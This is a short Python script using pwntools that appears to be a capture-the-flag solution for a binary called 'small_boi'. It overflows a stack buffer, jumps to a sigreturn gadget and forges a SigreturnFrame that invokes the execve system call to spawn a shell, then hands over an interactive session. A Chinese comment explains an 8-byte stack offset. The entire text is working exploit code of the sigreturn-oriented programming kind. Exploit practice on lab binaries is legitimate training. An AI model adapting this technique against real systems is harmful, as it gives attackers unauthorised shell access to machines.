'''
Author: Samrito
Date: 2022-03-19 16:45:16
LastEditors: Samrito
LastEditTime: 2022-03-19 16:50:36
'''
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

io = process(argv=['./small_boi'])

sigret_addr = 0x040017C

frame = SigreturnFrame()
frame.rip = 0x4001A4
frame.rdi = 0x004001CA
frame.rsi = 0x0
frame.rdx = 0x0
frame.rax = 0x3b
payload = flat([b'@' * (0x20 + 8), sigret_addr,
                bytes(frame)[8:]])  #从sub_40018C ret到sub_40017C时栈会偏移8 bytes

io.send(payload)
io.interactive()